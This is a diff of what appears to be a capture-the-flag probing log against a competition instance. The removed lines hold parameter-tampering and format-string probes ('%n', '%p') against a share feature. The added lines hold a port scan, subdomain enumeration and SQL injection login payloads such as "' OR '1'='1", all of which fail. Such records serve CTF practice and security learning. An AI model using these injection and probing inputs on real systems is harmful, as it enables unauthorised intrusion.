@@ -1,33 +1,30 @@
-ctf_bot profile BEFORE:  <div class="trainer-card"> <h1>@ctf_bot</h1> <p class="muted">This trainer hasn't written a bio yet.</p> </div> <h2>Shared boxes</h2> <ul class="feed"> <li class="muted">No shared boxes yet.</li> </ul> 
-share trainer=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share to=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share user=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share username=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share recipient=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share share_with=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share with=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share target=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share trainers=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-share who=ctf_bot -> 303 http://27wg1nxt69l0o1gh.instances.ctfcup.online/box/260
-ctf_bot profile AFTER:  <div class="trainer-card"> <h1>@ctf_bot</h1> <p class="muted">This trainer hasn't written a bio yet.</p> </div> <h2>Shared boxes</h2> <ul class="feed"> <li class="muted">No shared boxes yet.</li> </ul> 
-my profile:  <div class="trainer-card"> <h1>@trainer01</h1> <p class="box-desc">{&quot;a&quot;=&gt;&quot;x&quot;}</p> </div> <h2>Shared boxes</h2> <ul class="feed"> <li> <a href="/box/263"><strong>chain submitter <em>C</em></strong></a> <span class="muted">2026-10-31 17:46:23</span> </li> <li> <a href="/box/262"><strong>chain setter <strong>B</strong></strong></a> <span class="muted">2026-10-31 17:46:21</span> </li> <li> <a href="/box/261"><strong>single submit <span class="tag-fire">🔥A</span></strong></a> 
-comment mention -> 303
-bio mention -> 303
-tag '[b]%s%s%s[/b]' -> 303 
-tag '[shiny]%s%s%s[/shiny]' -> 303 
-tag '[fire]%s%s%s[/fire]' -> 303 
-tag '[b]%{x}[/b]' -> 303 
-tag '[shiny]%{x}[/shiny]' -> 303 
-tag '[fire]%{x}[/fire]' -> 303 
-tag '[b]%<x>s[/b]' -> 303 
-tag '[shiny]%<x>s[/shiny]' -> 303 
-tag '[fire]%<x>s[/fire]' -> 303 
-tag '[b]%d[/b]' -> 303 
-tag '[shiny]%d[/shiny]' -> 303 
-tag '[fire]%d[/fire]' -> 303 
-tag '[b]%n[/b]' -> 303 
-tag '[shiny]%n[/shiny]' -> 303 
-tag '[fire]%n[/fire]' -> 303 
-tag '[b]%p[/b]' -> 303 
-tag '[shiny]%p[/shiny]' -> 303 
-tag '[fire]%p[/fire]' -> 303 
+== port scan ==
+port 80 OPEN http 200  <!doctype html> <html lang="en"> <head>   <meta charset="utf-8">   <meta name="v
+port 443 OPEN non-http ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))
+port 1337 OPEN non-http ('Connection aborted.', BadStatusLine('[*] Please, enter token:\n'))
+== subdomains ==
+bot.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+admin.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+api.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+internal.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+worker.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+ctf-bot.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+ctfbot.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+app.27wg1nxt69l0o1gh.instances.ctfcup.online -> 51.250.50.53
+== sqli login ==
+login "ctf_bot' --"/'x' -> 401 
+login "ctf_bot' --"/"' OR '1'='1" -> 401 
+login "ctf_bot' OR '1'='1"/'x' -> 401 
+login "ctf_bot' OR '1'='1"/"' OR '1'='1" -> 401 
+login "ctf_bot'/*"/'x' -> 401 
+login "ctf_bot'/*"/"' OR '1'='1" -> 401 
+login 'ctf_bot" --'/'x' -> 401 
+login 'ctf_bot" --'/"' OR '1'='1" -> 401 
+login "admin' --"/'x' -> 401 
+login "admin' --"/"' OR '1'='1" -> 401 
+login "' OR 1=1 --"/'x' -> 401 
+login "' OR 1=1 --"/"' OR '1'='1" -> 401 
+login "ctf_bot' OR 1=1 --"/'x' -> 401 
+login "ctf_bot' OR 1=1 --"/"' OR '1'='1" -> 401 
+login 'ctf_bot\x00'/'x' -> 401 
+login 'ctf_bot\x00'/"' OR '1'='1" -> 401 
